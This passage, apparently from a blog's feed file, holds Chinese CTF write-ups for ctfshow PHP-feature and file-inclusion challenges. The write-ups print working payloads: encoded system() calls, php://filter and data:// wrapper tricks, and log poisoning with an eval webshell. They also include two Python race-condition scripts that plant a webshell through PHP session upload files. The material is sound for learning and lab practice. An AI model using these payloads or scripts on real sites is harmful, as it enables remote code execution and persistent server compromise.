src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205452667.png" alt="image-20221223205452667"></p><h2 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205853208.png" alt="image-20221223205853208"></p><p>和web141差不多</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223210018653.png" alt="image-20221223210018653"></p><p>用web141的payload，然后把%2b换成*号就行</p><h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223210505198.png" alt="image-20221223210505198"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就是不一定得是这种格式  1+phpinfo()+1   1+1+phpinfo()这种形式也行</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=-(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%d5^%ff%ff%ff%ff%ff%ff)&amp;v3=1</span><br><span class="line"></span><br><span class="line">//  就是11-xxxxxx</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223210903738.png" alt="image-20221223210903738"></p><h2 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223211005710.png" alt="image-20221223211005710"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223211416842.png" alt="image-20221223211416842"></p><p>就是其他加减乘除异或符号全被过滤了，但是在本地试了下  |没有被过滤，所以还是可以用的</p><p>但是取反没有被过滤，所以可以尝试来解</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=1&amp;v3=|(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)|</span><br></pre></td></tr></table></figure><h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223211955658.png" alt="image-20221223211955658"></p><p>用上一题的payload直接就可以打通关了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223212053007.png" alt="image-20221223212053007"></p><p>前面给过yu师傅写的构造方法了，这里在给一下</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223212251086.png" alt="image-20221223212251086"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的正则是第一个字符不能是数字字母 所以可以用   \   绕过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写 法</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于第一个参数为空，那么我们就得考虑去找一个能执行第一个参数为空的函数了，那么create_functino()就可以</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223213534323.png" alt="image-20221223213534323"></p><p>这里的思路是用}先把第一个if给包含住，然后在进行rce，后面的{是为了把下一行的}给包含住，#是为了把);给注释掉。</p><p>然后就可以进行rce了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223213759296.png" alt="image-20221223213759296"></p><h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223214111128.png" alt="image-20221223214111128"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223214505853.png" alt="image-20221223214505853"></p><p>本地试过了，这样也可以执行，那么就可以构造get_ctfshow_fl0g()</p><p>这是解法1</p><p><strong>解法二</strong></p><p>直接可以在eval里进行命令执行</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%d5^%ff%ff%ff%ff%ff%ff);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223214653400.png" alt="image-20221223214653400"></p><h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223221028213.png" alt="image-20221223221028213"></p><p>这里不能用其他文件来新建的原因是unlink函数会把其他函数给删除掉</p><p>所以只能覆盖掉index.php</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223221205356.png" alt="image-20221223221205356"></p><p>然后在访问index.php，进行post  rce 就能拿到flag了。</p><h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224145925518.png" alt="image-20221224145925518"></p><p>这道题可以用文件包含日志 /var/log/nginx/access.log</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就是因为$key为url/?后面的东西，那么在extract($_GET);传isVIP的时候，就要注意不能传有关正则匹配中的东西，不然的话就会代码就会执行结束。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的post传ctf的时候不含:就行，那么只要符合上述条件就行了。</span><br></pre></td></tr></table></figure><p>这里就可以考虑文件包含日志了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224150819031.png" alt="image-20221224150819031"></p><p>服务器是nginx的，那么就利用nginx的默认日志路径</p><p>只有一次机会，写错了就得重新开环境。</p><p><strong>第一步</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224151001019.png" alt="image-20221224151001019"></p><p><strong>第二步</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224194408896.png" alt="image-20221224194408896"></p><p><strong>第三步</strong></p><p>进行rce</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224194509564.png" alt="image-20221224194509564"></p><p>拿到flag.</p><h2 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150_plus"></a>web150_plus</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224194638649.png" alt="image-20221224194638649"></p><p>这里不给用日志包含了</p><p><strong>题解释</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这个题一点点小坑__autoload()函数不是类里面的</span><br><span class="line">__autoload — 尝试加载未定义的类</span><br><span class="line">最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦</span><br><span class="line">原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用</span><br><span class="line">__autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo</span><br><span class="line">接下来就去getshell啦</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224195350241.png" alt="image-20221224195350241"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224195525809.png" alt="image-20221224195525809"></p><p>直接拿到flag.</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow PHP特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow文件包含 刷题记录</title>
      <link href="/posts/7e0f78e.html"/>
      <url>/posts/7e0f78e.html</url>
      
        <content type="html"><![CDATA[<h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218155424650.png" alt="image-20221218155424650"></p><p>这是图片源码  这是文件包含的题目，没发现啥过滤，直接用php伪协议</p><pre><code class="lang-php://filter/read=convert.base64-encode/resource=[文件名]```">这就是个php伪协议详细可以看这篇 https://segmentfault.com/a/1190000018991087![image-20221218155810733](C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218155810733.png)base64解码拿到flag.## web79源码![image-20221218191018693](C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218191018693.png)这里的意思```str_replace```的意思是替换，把php替换成？？？所以filter就不行了，就得用data协议了![image-20221218190905540](C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218190905540.png)然后测试data协议可以不可以用![image-20221218191542931](C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218191542931.png)可用 然后就进行```tac f*```就行![image-20221218191640175](C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218191640175.png)拿到flag.## web80源码![image-20221218191750100](C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218191750100.png)##### 第一步先在User-Agent里面传入一句话脚本 ![image-20221218192218848](C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218192218848.png) UA那个地方如果php没被过滤的话，可以直接在链接后写```?&lt;?php eval($_POST[1]);?&gt;</code></pre><h5 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h5><p>取消掉UA的传参，然后根据题目得知是nginx服务器，然后把脚本写入到nginx服务器的日志里面。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218193807266.png" alt="image-20221218193807266"></p><h5 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h5><p>POST传参 <code>system(&quot;tac f*&quot;)</code>拿到flag</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218193854995.png" alt="image-20221218193854995"></p><p><strong>这道题的解法命令执行里面也有，方法都是一样的。</strong></p><h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218194036283.png" alt="image-20221218194036283"></p><p>​                                    <strong>这次多过滤了一个：</strong></p><p>但是解法和上一题一样，我就不多说了</p><h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220003101914.png" alt="image-20221220003101914"></p><p>这个利用了一个新的知识点，条件竞争。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220003145709.png" alt="image-20221220003145709"></p><p><a href="https://www.freebuf.com/articles/web/275557.html">https://www.freebuf.com/articles/web/275557.html</a>   讲条件竞争的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个条件竞争就是先用Cookie传PHPSESSID的值，然后会新建一个文件，然后这个文件会在上传结束后自动销毁，那么我们就可以利用条件竞争，就是在它删除之前访问这个文件，所以就得双线程访问，这就是条件竞争</span><br></pre></td></tr></table></figure><p>下面有其他师傅写的脚本</p><p><strong>脚本1：通杀脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @author:lonmar</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessID = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://7920d625-4983-43eb-9d4f-335e57303fd0.chall.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        response = session.post(</span><br><span class="line">            url,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,</span><br><span class="line">            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;cat *.php&quot;);?&gt;&#x27;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>, f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        response = session.get(url + <span class="string">&#x27;?file=/tmp/sess_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(sessID))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;test&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*]retrying...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>脚本二</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io,threading,requests</span><br><span class="line">url = <span class="string">&#x27;http://bb5282b9-dc00-44d5-98f0-1c93ed240d67.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">sessionid = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;file_put_contents(&quot;/var/www/html/2.php&quot;,&quot;&lt;?php eval(\$_POST[2]);?&gt;&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">500</span>)</span><br><span class="line">        response = session.post(url,data=&#123;</span><br><span class="line">            <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        cookies = &#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">        &#125;,</span><br><span class="line">        files = &#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;test.jpg&#x27;</span>,fileBytes)</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        response = session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,</span><br><span class="line">                                cookies = &#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">        &#125; )</span><br><span class="line">        response2 = session.get(url+<span class="string">&#x27;2.php&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> response2.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;+++++++++++done+++++++++++&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response2.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后接着访问2.php,利用2=xxxxx，就可以了</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221005206119.png" alt="image-20221221005206119"></p><p>利用上述的脚本，成功拿到flag.</p><h2 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221005403048.png" alt="image-20221221005403048"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221005749022.png" alt="image-20221221005749022"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这比上一题多的是，得先销毁session，才能包含</span><br></pre></td></tr></table></figure><p>利用上一题的脚本直接可以拿到flag.</p><h2 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221005904110.png" alt="image-20221221005904110"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的system(&quot;rm -rf /tmp/*&quot;);的意思是把/tmp/里的所有文件全部删掉，所以就是在文件包含之前，把文件全删除掉，让我们没有办法包含。</span><br></pre></td></tr></table></figure><p>那么我们去用脚本1，通杀脚本就可以直接拿到flag。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221010332842.png" alt="image-20221221010332842"></p><h2 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221011123166.png" alt="image-20221221011123166"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里多的是判断文件是否存在，和文件内容里不能有&lt;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221011315936.png" alt="image-20221221011315936"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用上面写的通杀脚本，就可以全部给绕过去了，我觉得ctfshow已经把所有可能的情况已经进行了说明，以后在碰到条件竞争的题目，都可以直接拿脚本去打了。</span><br></pre></td></tr></table></figure><h2 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221011756929.png" alt="image-20221221011756929"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题是定义了一个包含路径</span><br></pre></td></tr></table></figure><p>但是还是可以用通杀脚本，直接打</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221011856807.png" alt="image-20221221011856807"></p><p>又可以直接拿到flag.</p><h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221154638729.png" alt="image-20221221154638729"></p><p><a href="https://xz.aliyun.com/t/8163#toc-3">https://xz.aliyun.com/t/8163#toc-3</a></p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这两篇文章都是讲php://filter   和  file_get_contents()的关系</span><br></pre></td></tr></table></figure><p><strong>方法一</strong></p><p>利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=flag.php</span><br></pre></td></tr></table></figure><p>这道题就是比较奇怪</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;ls&#x27;);?&gt;  直接base64   加上前两个aa不行，但是在后面随便加点东西在base64，就欧克了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为什么要这么做呢，因为就是题目给的这个&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;会直接不让后面的代码执行，我们就得把这个给消掉，那么就得用到base64解码了，base64解码是4位一解，那么为了确保后面的代码能够正常解码，那么就得补齐前面的</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;  这个只会解码phpdie，所以为了后面的能够正常解出，我们就得在前面随便加两个字母，例如aa,那么解码后，&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;这个会变成乱码，php就不会执行，就会执行后面的代码，那么就可以成功绕过了，   上面给的两个链接就是专门讲这个这个的，可以去看看来学习学习</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221174133455.png" alt="image-20221221174133455"></p><p>然后进行两次file的url全编码,给content赋值base64编码，然后访问flag.php，就可以成功拿到flag。</p><p><strong>方法二</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=string.rot13/resource=2.php</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221171341013.png" alt="image-20221221171341013"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221171030922.png" alt="image-20221221171030922"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就是先把&lt;?php system(&#x27;tac f*&#x27;);?&gt;进行rot13加密，然后php伪协议的rot13在进行加密一次就会返回到原来的样子，这里为什么会对file后面的内容进行两次url全编码呢，因为就是题目会进行一次url解码，浏览器也会对url进行一次解码，所以得进行两次url编码。</span><br></pre></td></tr></table></figure><h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><p>源码’</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221171715697.png" alt="image-20221221171715697"></p><p>这里不能用php了，那么可以尝试使用data协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZionKTs/PmV4aXQoKTs</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">后面的base64编码为&lt;?php system(&#x27;tac f*&#x27;);?&gt;exit();  把最后一个等号给去掉就行。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221173049568.png" alt="image-20221221173049568"></p><h2 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221210201032.png" alt="image-20221221210201032"></p><p>把视频下载下来就可以看到源码了，然后访问flag.php,就可以拿到flag,</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221210254574.png" alt="image-20221221210254574"></p><h2 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221211458359.png" alt="image-20221221211458359"></p><p>这里可以采用一个新的姿势，就是字符编码转换。</p><p><a href="https://xz.aliyun.com/t/8163#toc-12">https://xz.aliyun.com/t/8163#toc-12</a></p><p>这篇文章总结了好多中姿势，可以参考来学习。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题用的是编码转换，就是可以让传进来的值经过编码转换后，变成一句话木马，当然die()也会被转换成乱码，php就无法执行，因为这个字符编码转换，转换两次就会变回原样，和rot13一样，所以我们就先转换一遍。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221212856165.png" alt="image-20221221212856165"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221212908787.png" alt="image-20221221212908787"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221213040079.png" alt="image-20221221213040079"></p><p>然后访问a.php进行rce就可以拿到flag了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu刷题记录</title>
      <link href="/posts/71cd69a5.html"/>
      <url>/posts/71cd69a5.html</url>
      
